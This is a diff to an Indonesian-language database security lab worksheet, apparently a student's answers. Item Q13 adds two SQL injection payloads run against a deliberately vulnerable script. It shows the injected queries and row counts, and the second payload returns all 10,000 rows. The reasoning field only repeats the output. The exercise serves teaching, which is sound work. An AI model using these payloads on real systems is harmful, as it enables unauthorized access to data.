@@ -140,12 +140,31 @@ Alasan keputusan: Pengujian baseline dengan masukan normal "Pelanggan 12" dilaku
 
 13. Q13
 Perintah:
+# 1. Payload tanpa komentar penutup
+python rentan.py "zz' OR '1'='1"
+
+# 2. Payload dengan komentar SQL (--)
+python rentan.py "zz' OR '1'='1' --"
 ---
 
-Keluaran:
+Keluaran: 
+# Hasil 1:
+SQL tercetak: SELECT id, nama, kota FROM lab11.pelanggan WHERE nama ILIKE '%zz' OR '1'='1%'
+Jumlah baris: 0
+
+# Hasil 2:
+SQL tercetak: SELECT id, nama, kota FROM lab11.pelanggan WHERE nama ILIKE '%zz' OR '1'='1' --%'
+Jumlah baris: 10000
 ---
 
-Alasan keputusan:
+Alasan keputusan: 
+# Hasil 1:
+SQL tercetak: SELECT id, nama, kota FROM lab11.pelanggan WHERE nama ILIKE '%zz' OR '1'='1%'
+Jumlah baris: 0
+
+# Hasil 2:
+SQL tercetak: SELECT id, nama, kota FROM lab11.pelanggan WHERE nama ILIKE '%zz' OR '1'='1' --%'
+Jumlah baris: 10000
 ---
 
 14. Q14
